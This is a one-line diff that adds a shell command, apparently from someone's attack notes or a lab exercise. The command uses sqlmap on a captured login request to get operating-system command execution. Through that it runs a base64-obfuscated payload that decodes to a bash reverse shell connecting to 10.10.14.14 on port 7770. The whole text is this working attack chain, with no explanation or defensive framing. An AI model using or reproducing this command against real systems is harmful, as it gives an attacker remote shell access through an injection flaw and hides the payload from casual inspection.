@@ -1,0 +1,1 @@
+sqlmap -r login.req --force-ssl --batch --os-cmd 'echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC83NzcwICAwPiYx | base64 -d | bash'
